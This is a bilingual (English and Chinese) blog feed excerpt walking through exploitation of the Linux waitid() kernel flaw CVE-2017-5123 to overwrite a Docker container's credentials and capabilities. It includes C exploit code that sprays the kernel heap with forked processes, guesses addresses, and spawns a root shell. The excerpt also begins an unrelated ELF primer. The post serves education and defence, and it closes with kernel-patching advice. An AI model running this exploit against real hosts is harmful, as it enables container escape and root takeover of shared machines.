  &lt;p&gt;在這個章節我將專注在簡短概觀的 Linux capabilities - 它們是什麼，與Docker 如何使用它們，與它們在記憶體中如何被表示。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The code snippet below is taken from &lt;em&gt;linux/cred.h&lt;/em&gt; and is the definition of the credentails struct that each process has:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下方是從 &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/include/linux/cred.h&quot;&gt;linux/cred.h&lt;/a&gt; 擷取的程式碼片段 ，為每個行程的認證資訊結構：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct cred {
    atomic_t usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t subscribers; /* number of processes subscribed */
    void *put_addr;
    unsigned magic;
#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t uid; /* real UID of the task */
    kgid_t gid; /* real GID of the task */
    kuid_t suid; /* saved UID of the task */
    kgid_t sgid; /* saved GID of the task */
    kgid_t euid; /* effective UID of the task */
    kuid_t egid; /* effective GID of the task */
    kuid_t fsuid; /* UID for VFS ops */
    kgid_t fsgid /* GID for VFS ops */
    Unsigned securebits; /* SUID-less security management */
    Kernel_cap_t cap_inheritable; /* caps our children can inherit */
    Kernel_cap_t cap_permitted; /* caps we're permitted */
    Kernel_cap_t cap_effective; /* caps we can actually use */
    Kernel_cap_t cap_ambient; /* Ambient capability set */
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;man capabilities:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuse into distinc units, known as &lt;em&gt;capabilities&lt;/em&gt;, which can be independently enabled and disabled. Capabilities are a per-thread attribute.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;從核心 2.2開始，Linux 將傳統與超級使用者相關聯的權限分成不同的單元，可被個別啟用及停用，並稱之為 &lt;em&gt;capabilities&lt;/em&gt;。每個執行緒都會有各自的 Capabilities 屬性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Linux capabilities are stored inside each process’s own &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and represented by a bitmask. For example all caps enabled would be represented by a bitmask of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Linux capabilities 被儲存在每個行程自己的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 並使用 bitmask 來表示。例如所有的 caps 都被啟用的話，則用 bitmask 表示成 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Each capability provides a different set of permissions, for instance:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;每個 capability 提供一個不同的權限分配，舉例來說:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - allows for loading &amp;amp; unloading kernel modules.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - allows for various network operations. For example entering promiscuous mode, interface configuration and more.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more(this cap gives the most privileges and overloads others).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - 允許載入或卸載核心模組。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - 允許數種網路操作，例如開啟混沌模式，介面設定等等。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - 啟用一個範圍內的系統管理操作，如 quotactl, mount, umount, swapon, setdomainname, ptrace 等等(這個 cap 給了最多權限並會多載其他的 cap)。
(編按:這個權限在 Linux manual 中建議最好避免使用，畢竟會賦予非常多的權限，幾乎可以說是一個另類的 root，除非須需求幾乎等同於此 cap，否則建議能避則避。)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;You can find the full list of CAPS over here.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;你可以在&lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;這裡&lt;/a&gt;找到完整的 CAPS 清單。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Docker uses capabilites to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kenrel modules.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Docker 使用 capabilities 來為容器提供一個較好的隔離環境。Docker 純粹的將可能造成脫離容器的 capabilities 拿掉。例如，你會幾乎看不到一個容器運行在限制之外，有著上述三個 capabilities 的任何一個，當一個容器可以存取網路介面並嗅探其他容器或是主機的流量，或是一個在容器中的使用者可以在主機上掛上目錄並且載入核心模組，這些都是有安全疑慮的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Although it might be easier to build a ROP chain and call commit_creds(0) in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of struct creds like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing(we are limited to 0x8000) and the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; is out of reach for us.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;雖然造一個 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP&lt;/a&gt;鏈來呼叫 commit_creds(0) 以獲得 root 權限與全部的 capabilities 似乎來的更簡單一點，但為了學到更多與堆積噴灑相關的技巧，並且在不知道目標環境下的漏洞利用方法，就像 Federico 做的一樣，將數千個 creds 結構噴好噴滿到核心堆積中。這個漏洞利用的缺點就是無法取得全部的 caps，因為我們無法控制寫入的東西(我們受限於 0x8000 的限制) 而且 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; 對我們來說是不可能達到的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;the-vulnerability--弱點成因&quot;&gt;The vulnerability / 弱點成因&lt;/h2&gt;

&lt;p&gt;The code snippet below is taken from &lt;em&gt;kernel/exit.c&lt;/em&gt; and is in charnge of handling the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這是從 &lt;em&gt;kernel/exit.c&lt;/em&gt; 取得的程式碼片段，負責處理系統
呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt;:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;SYSCALL_DEFINE5(waitid, int, which , pid_t, upid, struct siginfo __user *, infop, int, options, struct rusage __user *, ru)
{
    struct rusage r;
    struct waitid_info info = {.status = 0};
    
    long err = kernel_waitid(which, upid, &amp;amp;info, options, ru ? &amp;amp;r : NULL);
    
    int signo = 0;
    
    if (err &amp;gt; 0) {
        signo = SIGCHLD;
        err = 0;
        if (ru &amp;amp;&amp;amp; copy_to_user(ru, &amp;amp;r, sizeof(sturct rusage)))
        return -EFAULT;
    }
    if (!infop)
        return err;
    
    if (!/*醒目*/access_ok/*提示*/(VERIFY_WRITE, infop, sizeof(*infop)))
        return -EFAULT; 
    user_access_begin();
    unsafe_put_user(signo, &amp;amp;infop-&amp;gt;si_signo, Efault);
    unsafe_put_user(0, &amp;amp;infop-&amp;gt;si_errno, Efault);
    unsafe_put_user(info.cause, &amp;amp;infop-&amp;gt;si_code, Efault);
    unsafe_put_user(info.pid, &amp;amp;infop-&amp;gt;si_pid, Efault);
    unsafe_put_user(info.uid, &amp;amp;infop-&amp;gt;si_uid, Efault);
    unsafe_put_user(info.status, &amp;amp;infop-si_status, Efault);
    user_access_end();
    return err;
Efault:
    user_access_end();
    return -EFAULT;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerability is that the highlighted &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; check, which ensures that the user specified pointer is in face a user-space pointer, was missing in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;弱點在於有醒目提示的 &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; 檢查，用來保證使用者指定的指標是屬於使用者空間的指標，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫中少了這個檢查，缺了這個檢查，使用者可以提供一個核心地址指標，當執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt; 時系統呼叫會毫無異議的寫入該位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As we already know - we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如同我們已經知道的 - 我們不能任意的想寫入哪裡就寫入哪裡，但我們必須在這些限制之下，竭盡我們所能的嘗試獲取可寫位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt; is a 32bit int, but the value of status is constrained to 0 &amp;lt; status &amp;lt; 256 as we can ses in the exit codes documentation, and as we already know&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;is constrained by&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt;是一個 32bit 整數，但狀態的值被約束在 0 與 256 之間，就像我們在 exit 程式碼文件看到的，同時我們也知道&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;被&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;約束了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;At this point we have the ability to write a value of pid: 0 &amp;lt; pid &amp;lt; 0x8000 to anywhere we want. The next challenge is to detect where we should write in order to successfully overwirte the desired values.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目前我們有寫入 pid 值得能力: 介於 0 到 0x8000，到任意我們想要的地方，下一個挑戰是偵測到我們該寫到的位置，才能成功的覆寫想要的值。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We need to rememer that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們需要記得，系統呼叫在每次執行的時候，實際上會寫入 6 個不同欄位，因為有 6 個 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt; 被執行了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So we will need to take into account the offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; sturct and use it to subtract that value from the target address into &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall as the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; pointer.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以我們需要帶入 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 結構中 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; 的帳戶偏移值，並使用它減去到 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 呼叫的目標位址的值作為 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 指標。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們使用這個漏洞利用的主要目標是，覆寫 Docker 為我們設定的 capabilities，就可以獲得額外的權限並且逃離容器。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;spray-n-pray--噴灑並禱告&quot;&gt;Spray n’ Pray / 噴灑並禱告&lt;/h2&gt;

&lt;p&gt;I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of struct &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; and then start guessing by writing to various addresses and pray to hit my target.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我決定使用與 Federico 相似的方法，所以我用數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; 結構將核心堆積噴好噴滿，然後開始透過寫入不同位址來猜測，禱告並祈求可以擊中我的目標。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;By picking a value that we can track such as &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (which we can track with getuid()).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;藉著選一個我們可以追蹤的值如 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (我們可以使用 getuid() 來追蹤)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can, with a little bit a luck, pinpoint our &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; location, after which we will be able to write to specific offsets in order to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; and anything else we want.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;幸運的話，我們可以做到的，指向我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 位置，之後我們將能寫到指定的偏移，就可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 與其他任何我們想要的東西。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But in order to do that we need to figure out the actual offsets, which we will do with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;但為了要實現，我們需要搞清楚真實的偏移值，我們將依靠 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 的幫助來實現:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; is 4 bytes in size, as such if we found uid on &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; than &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;, 4 bytes above, and &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt; which is 4*0x4=0x10 bytes above our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; address as illustrated in the diagram below.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;猶如我們看到的， &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; 是 4 個位元組的大小，因為醬子，如果我們在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; 發現 uid ，那麼 &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;， 4 個位元組之上，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt;，就是 4*0x4=0x10(編按: 0x開頭是16進位，並非0乘4) 位元組之上，我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 位址，如下圖所示。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So essentially in order to overwite our caps will have to write to:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以重要的是為了覆寫我們的 caps 將必須寫到:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inferitable&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Note: These addresses are relevant to my system, your addresses might differ.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註: 這些位址跟我的系統有相關聯，你的位址可能會不一樣。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to find out where our sprayed &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; might land in the heap we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; again and set a breakpoint on &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; in order to break when our program calls &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;為了找到我們噴灑的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 在堆積中可能的落點，我們將再次使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 並設置一個中斷點在 &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; 上，以便在程式呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 的時候中斷下來。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A few step commands after the breakpoint (it took 5 on my system) should reveal the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; address in the RAX register.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;斷下來後，步進幾個指令(在我的系統上是 5 個)應該會在 RAX 暫存器中顯示 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 的位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; is most likely to be in the heap&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們可以重複這個找結構的過程，藉由數個分叉(fork)以便收集足夠的位址並分析統計 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 在堆積中最有可能的所在。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So the plan is as follows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;計畫如下:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;Spawn thousands of processes by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; in order to create thousands of &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; in the kernel heap and make each of the processes constantly check if its UID==0 by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Start writing the value 0 to addresses to which the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; might land&lt;/li&gt;
  &lt;li&gt;If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; value with our guesses from step 2. Now we can overwrite the rest of the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and change caps by writing to the offsets that we determined.&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;為了在核心堆積中創造數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 需要透過呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; 產生數千個行程，並且呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 使每個行程都不斷地檢查它自己的 UID 是否為 0&lt;/li&gt;
    &lt;li&gt;開始將 0 寫入位 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; 可能的落點位址中&lt;/li&gt;
    &lt;li&gt;當其中一個我們分叉(fork)出來的行程獲得 uid 為 0，就代表我們已經成功從第二步猜測到並覆寫了&lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt;的值。現在我們可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 其餘的部分並藉由覆寫我們計算的值來修改 caps。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;Our dirty exploit will be something to the effect of:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們的髒髒漏洞利用效果如下:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;void writecaps(char *addr,unsigned long value){
while(1) {
      int pid = clone(exit_func, &amp;amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
      if (!pid) {
        exit(0);
      }
      if (pid == value) {
        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
        break;
      }
}

void spraynpray(){
pid_t pid;
FILE *f;
char *argv[] = {&quot;/bin/sh&quot;, NULL};
for (int i=0;i&amp;lt;5000;i++)
{
    pid = fork();
    if (pid==0)
    { // child process
  while (1) {
    
    if (*glob_var==1) {
      syscall(SYS_exit, 0);
    }
    if (getuid() == 0){
        //FOUND!!
    printf(&quot;[+] Got UID: 0 !\n&quot;);
     *glob_var = 1;
     writecaps((char *)finalcapsaddress,value);
    printf(&quot;Done, spawning a shell \n&quot;);
    execve(&quot;/bin/sh&quot;, argv, NULL);
    }
}
    }

    else if(pid&amp;lt;0)
    {
        printf(&quot;failed to fork&quot;);
    }

    else // parent process
    {

    }
}
}

void swapuid(){

    char* i,p;
    while(*glob_var!=1)
    {
    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
        {
        if(*glob_var==1)
            {
            break;
            }
        printf(&quot;trying %p\n&quot;,i);
        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
        sleep(1);
        }
    }
munmap(glob_var, sizeof *glob_var);
printf(&quot;Found uid on %p\n&quot;,i-0xc0);
sleep(10000);
}

int main(void)
{
    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *glob_var = 0;

unsigned long* base = findbase();
    findheapbase();
    spraynpray();
    swapuid();
}
    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在分析我的系統資後 (Ubuntu 17.10, 核心 4.13.0-15, 架構 x86-64)，我發現數個區域貌似是運行時 creds 結構有 70% 以上的落點，但那仍然有使機器掛掉的風險存在，因為我們可能會覆寫到核心中重要的東西。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;conclusion--結論&quot;&gt;Conclusion / 結論&lt;/h2&gt;

&lt;p&gt;In 2017 alone, 434 linux kernel exploits where found, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;光是 2017 年就已經有 &lt;a href=&quot;https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33&quot;&gt;434 個 Linux 核心漏洞利用&lt;/a&gt;被發現，如同你在這篇文章中看到的一樣，核心漏洞利用對容器環境來說是具毀滅性的。這是因為容器與主機分享核心，因此光是信任內建的保護機制並不足夠。確保你的核心在所有的產品主機都總是最新的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Thank you for reading and don’t forget to follow us @TwistlockLabs.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;謝謝你的閱讀，別忘了在 &lt;a href=&quot;https://twitter.com/TwistlockLabs&quot;&gt;@TwistlockLabs&lt;/a&gt; 跟隨我們。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Big credits to Federico Bento for pointing some things out and to &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt; for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;給點清了某些事情的&lt;a href=&quot;https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/&quot;&gt;Federico Bento&lt;/a&gt;一個大大的讚， &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt;也是，感謝他的 Chrome 沙盒逃脫漏洞利用; 我的漏洞利用大多數是基於他們的成果。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Docker" /><category term="CVE" /><category term="Linux" /><summary type="html">The post describes how I exploited the waitid() vulnerability in order to modify the Linux capabilities of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.</summary></entry><entry><title type="html">Linux ELF 二進位檔案入門：搞懂兼分析</title><link href="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html" rel="alternate" type="text/html" title="Linux ELF 二進位檔案入門：搞懂兼分析" /><published>2018-03-08T00:00:00+08:00</published><updated>2018-03-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html">&lt;h1 id=&quot;the-101-of-elf-binaries-on-linux-understanding-and-analysis&quot;&gt;The 101 of ELF Binaries on Linux: Understanding and Analysis&lt;/h1&gt;

&lt;h2 id=&quot;executable-and-linkable-format-可執行檔與可連結格式&quot;&gt;Executable and Linkable Format 可執行檔與可連結格式&lt;/h2&gt;

&lt;p&gt;An extensive dive into ELF files: for security incident response, development, and better understanding&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;廣泛的深入 ELF 檔案: 為了資安事件響應、程式開發與更好的理解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We often don’t realize the craftsmanship of others, as we conceive them as normal. One of these things is the usage of common tools, like &lt;em&gt;ps&lt;/em&gt; and &lt;em&gt;ls&lt;/em&gt;.Even though the commands might be perceived as simple, under the hood there is more to it: ELF binaries. Let’s have an introduction into the world of this common file format for Linux and UNIX-based systems.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們通常不理解其他的技術，把他們想的跟喝水一樣普通。其一便是一般工具的使用方法，像是 &lt;em&gt;ps&lt;/em&gt; 與 &lt;em&gt;ls&lt;/em&gt;。甚至該指令可能是被認為簡單的，其實還有更多隱藏在 ELF 二進位格式中。讓我們向世界介紹這個在 Linux 與 基於 UNIX 系統上普遍可見的檔案格式。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Why learn the details of ELF ? 為什麼要了解 ELF 的細節?&lt;/strong&gt;&lt;/p&gt;

